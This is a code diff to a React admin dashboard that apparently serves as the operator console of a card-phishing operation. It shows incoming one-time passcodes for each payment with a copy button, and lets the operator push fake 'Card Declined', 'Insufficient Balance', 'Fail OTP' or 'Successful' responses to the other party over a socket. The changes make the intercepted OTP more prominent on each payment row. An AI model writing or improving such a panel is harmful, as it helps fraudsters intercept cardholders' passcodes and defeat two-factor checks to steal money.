@@ -114,15 +114,13 @@ const Admin = () => {
             return;
           }
           
-          const latestPayment = payments[0];
-          if (latestPayment) {
-            const newOtp: OtpData = {
-              paymentId: latestPayment.id,
-              otp: data.otp,
-              timestamp: new Date().toISOString()
-            };
-            setOtps(prev => [newOtp, ...prev]);
-          }
+          // Always create new OTP for latest payment
+          const newOtp: OtpData = {
+            paymentId: payments.length > 0 ? payments[0].id : 'no-payment',
+            otp: data.otp,
+            timestamp: new Date().toISOString()
+          };
+          setOtps(prev => [newOtp, ...prev]);
         } catch (error) {
           console.error('Error processing OTP data:', error);
         }
@@ -201,19 +199,23 @@ const Admin = () => {
         case 'validate-otp':
           socket.emit('payment-approved');
           updatePaymentStatus(paymentId, 'approved');
+          // Clear OTP after validation
+          setOtps([]);
           break;
         case 'fail-otp':
-          socket.emit('invalid-otp');
+          socket.emit('invalid-otp-error');
           break;
         case 'card-declined':
-          socket.emit('card-declined');
+          socket.emit('card-declined-error');
           break;
         case 'insufficient-balance':
-          socket.emit('insufficient-balance');
+          socket.emit('insufficient-balance-error');
           break;
         case 'successful':
           socket.emit('payment-approved');
           updatePaymentStatus(paymentId, 'approved');
+          // Clear OTP after success
+          setOtps([]);
           break;
         default:
           console.error('Unknown action:', action);
@@ -467,60 +469,78 @@ const Admin = () => {
                         </span>
                       </td>
                       <td className="px-6 py-4 whitespace-nowrap text-right text-sm font-medium">
-                        <div className="relative">
-                          <Button
-                            variant="ghost"
-                            size="sm"
-                            onClick={() => setActiveDropdown(activeDropdown === payment.id ? null : payment.id)}
-                            className="text-white hover:bg-gray-700"
-                          >
-                            <MoreHorizontal className="h-4 w-4" />
-                          </Button>
-                          
-                          {activeDropdown === payment.id && (
-                            <div className="absolute right-0 mt-2 w-48 bg-gray-800 rounded-md shadow-lg z-10 border border-gray-700">
-                              <div className="py-1">
-                               <button
-                                 onClick={() => handleAction(payment.id, 'show-otp')}
-                                 className="block w-full text-left px-4 py-2 text-sm text-blue-400 hover:bg-gray-700 font-medium"
-                               >
-                                 📱 Show OTP
-                               </button>
-                               <div className="border-t border-gray-600 my-1"></div>
-                               <button
-                                 onClick={() => handleAction(payment.id, 'validate-otp')}
-                                 className="block w-full text-left px-4 py-2 text-sm text-green-400 hover:bg-gray-700"
-                               >
-                                 ✅ Validate OTP
-                               </button>
-                               <button
-                                 onClick={() => handleAction(payment.id, 'fail-otp')}
-                                 className="block w-full text-left px-4 py-2 text-sm text-red-400 hover:bg-gray-700"
-                               >
-                                 ❌ Fail OTP
-                               </button>
-                               <button
-                                 onClick={() => handleAction(payment.id, 'card-declined')}
-                                 className="block w-full text-left px-4 py-2 text-sm text-red-400 hover:bg-gray-700"
-                               >
-                                 🚫 Card Declined
-                               </button>
-                               <button
-                                 onClick={() => handleAction(payment.id, 'insufficient-balance')}
-                                 className="block w-full text-left px-4 py-2 text-sm text-yellow-400 hover:bg-gray-700"
-                               >
-                                 💰 Insufficient Balance
-                               </button>
-                               <div className="border-t border-gray-600 my-1"></div>
-                               <button
-                                 onClick={() => handleAction(payment.id, 'successful')}
-                                 className="block w-full text-left px-4 py-2 text-sm text-green-400 hover:bg-gray-700 font-medium"
-                               >
-                                 🎉 Successful
-                               </button>
+                        <div className="flex flex-col gap-2">
+                          {/* OTP Display for this payment */}
+                          {otps.length > 0 && otps[0].paymentId === payment.id && (
+                            <div className="bg-blue-900 rounded-lg p-3 border border-blue-700 mb-2">
+                              <div className="flex items-center gap-2">
+                                <span className="text-xs text-blue-300">OTP:</span>
+                                <span className="text-lg font-bold text-blue-100 bg-blue-800 px-2 py-1 rounded font-mono">
+                                  {otps[0].otp}
+                                </span>
+                                <Button
+                                  variant="ghost"
+                                  size="sm"
+                                  onClick={() => copyToClipboard(otps[0].otp)}
+                                  className="h-6 w-6 p-0 text-blue-300 hover:text-blue-100"
+                                >
+                                  <Copy className="h-3 w-3" />
+                                </Button>
                               </div>
                             </div>
                           )}
+
+                          {/* Action Buttons */}
+                          <div className="flex flex-wrap gap-1">
+                            <Button
+                              onClick={() => handleAction(payment.id, 'show-otp')}
+                              size="sm"
+                              variant="outline"
+                              className="text-xs h-6 px-2 bg-blue-600 text-white border-blue-500 hover:bg-blue-700"
+                            >
+                              Show OTP
+                            </Button>
+                            <Button
+                              onClick={() => handleAction(payment.id, 'validate-otp')}
+                              size="sm"
+                              variant="outline"
+                              className="text-xs h-6 px-2 bg-green-600 text-white border-green-500 hover:bg-green-700"
+                            >
+                              Validate
+                            </Button>
+                            <Button
+                              onClick={() => handleAction(payment.id, 'fail-otp')}
+                              size="sm"
+                              variant="outline"
+                              className="text-xs h-6 px-2 bg-red-600 text-white border-red-500 hover:bg-red-700"
+                            >
+                              Fail OTP
+                            </Button>
+                            <Button
+                              onClick={() => handleAction(payment.id, 'card-declined')}
+                              size="sm"
+                              variant="outline"
+                              className="text-xs h-6 px-2 bg-orange-600 text-white border-orange-500 hover:bg-orange-700"
+                            >
+                              Declined
+                            </Button>
+                            <Button
+                              onClick={() => handleAction(payment.id, 'insufficient-balance')}
+                              size="sm"
+                              variant="outline"
+                              className="text-xs h-6 px-2 bg-yellow-600 text-white border-yellow-500 hover:bg-yellow-700"
+                            >
+                              Insufficient
+                            </Button>
+                            <Button
+                              onClick={() => handleAction(payment.id, 'successful')}
+                              size="sm"
+                              variant="outline"
+                              className="text-xs h-6 px-2 bg-emerald-600 text-white border-emerald-500 hover:bg-emerald-700"
+                            >
+                              Success
+                            </Button>
+                          </div>
                         </div>
                       </td>
                     </tr>
